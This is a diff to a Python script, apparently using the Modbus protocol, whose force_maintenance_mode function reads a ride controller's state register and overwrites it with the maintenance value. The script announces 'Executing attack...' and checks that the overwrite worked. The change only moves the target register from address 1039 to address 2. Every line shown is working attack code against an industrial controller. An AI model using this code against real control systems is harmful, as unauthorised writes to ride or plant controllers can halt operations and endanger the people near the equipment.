@@ -41,7 +41,7 @@ def force_maintenance_mode():
     print()
 
     # Read current state
-    result = client.read_holding_registers(1039, 1, slave=1)
+    result = client.read_holding_registers(2, 1, slave=1)
     if result.isError():
         print("✗ Failed to read ride state")
         client.close()
@@ -72,17 +72,17 @@ def force_maintenance_mode():
     print()
 
     print("Executing attack...")
-    print("  → Writing 5 to state register (MW15)")
+    print("  → Writing 5 to state register (MW2)")
 
-    # Force state to 5 (Maintenance) - MW15 = address 1039
-    result = client.write_register(1039, 5, slave=1)
+    # Force state to 5 (Maintenance)
+    result = client.write_register(2, 5, slave=1)
     if not result.isError():
         print("  ✓ State register overwritten!")
         print()
 
         # Verify state change
         time.sleep(0.5)
-        result = client.read_holding_registers(1039, 1, slave=1)
+        result = client.read_holding_registers(2, 1, slave=1)
         if not result.isError():
             new_state = result.registers[0]
             print(f"Verified New State: {new_state} ({state_names[new_state] if new_state < len(state_names) else 'Unknown'})")
